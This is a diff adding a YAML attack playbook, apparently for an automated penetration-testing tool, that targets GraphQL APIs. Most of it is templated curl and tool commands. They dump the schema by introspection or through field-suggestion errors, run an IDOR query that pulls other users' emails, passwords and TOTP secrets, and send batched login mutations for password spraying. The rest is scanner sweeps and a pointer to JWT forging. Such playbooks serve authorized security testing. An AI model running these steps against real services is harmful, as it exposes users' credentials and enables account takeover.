@@ -1,0 +1,49 @@
+id: api_graphql_introspection
+title: "GraphQL — introspection enum + IDOR + batched-attack auth bypass"
+phase: web
+mitre: ["T1190", "T1212"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["graphql", "/graphql", "/v1/graphql", "/api/graphql", "/gql"]
+  cves: []
+keywords: ["graphql", "introspection", "graphql-voyager", "graphql injection", "batch attack", "graphql idor"]
+preconditions:
+  - "GraphQL endpoint identified (/graphql, /api/graphql, /v1/graphql, etc.)"
+steps:
+  - tool: curl
+    cmd:  "curl -s -X POST {graphql_url} -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'"
+    why:  "Introspection probe — full schema if enabled (it usually is in non-prod)"
+  - tool: graphql-cop
+    cmd:  "graphql-cop -t {graphql_url} -o report.json"
+    why:  "Audit common misconfigs: introspection, debug mode, alias overload, batch attack, field suggestions"
+  - tool: graphql-voyager
+    cmd:  "graphw00f -t {graphql_url}; graphql-voyager file://schema.json"
+    why:  "Visualise schema graph after introspection — quickly spot sensitive types (User.password, AuditLog, etc.)"
+  - tool: clairvoyance
+    cmd:  "clairvoyance {graphql_url} -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -o schema.json"
+    why:  "Schema reconstruction WITHOUT introspection — uses field-suggestion error messages"
+  - tool: curl
+    cmd:  "curl -s -X POST {graphql_url} -d '{\"query\":\"{user(id:\\\"1\\\"){email password totpSecret}}\"}'"
+    why:  "IDOR — switch ID to enumerate other users; password / token fields often unfiltered"
+  - tool: curl
+    cmd:  "curl -s -X POST {graphql_url} -d '{\"query\":\"{__schema{queryType{fields{name}}}}\"}' -H 'Authorization: Bearer {token}'"
+    why:  "Authenticated enum — sometimes admin-only fields appear here vs anon"
+  - tool: curl
+    cmd:  "curl -s -X POST {graphql_url} -d '[{\"query\":\"mutation{login(user:\\\"a\\\",pass:\\\"a\\\")}\"},{\"query\":\"mutation{login(user:\\\"a\\\",pass:\\\"b\\\")}\"}]'"
+    why:  "Batch attack — many implementations don't rate-limit batched login mutations → unbounded password spray"
+  - tool: graphql-cop
+    cmd:  "graphql-cop -t {graphql_url} --batch"
+    why:  "Detect batch + alias overloading vulnerabilities at scale"
+  - tool: nuclei
+    cmd:  "nuclei -tags graphql -u {graphql_url}"
+    why:  "Sweep all known GraphQL CVEs / misconfigs"
+expected_outcome: "Full schema + IDOR/horizontal-privesc + auth bypass via batch mutations"
+fallbacks:
+  - "Introspection disabled? → use clairvoyance with field-name wordlist (works on Apollo/Hasura)"
+  - "JWT in Authorization → see auth_jwt_alg_none playbook for forging"
+  - "Subscriptions over WebSocket — separate auth model, often weaker"
+references:
+  - "https://book.hacktricks.xyz/pentesting-web/graphql"
+  - "https://github.com/dolevf/graphw00f"
+  - "https://github.com/dolevf/graphql-cop"
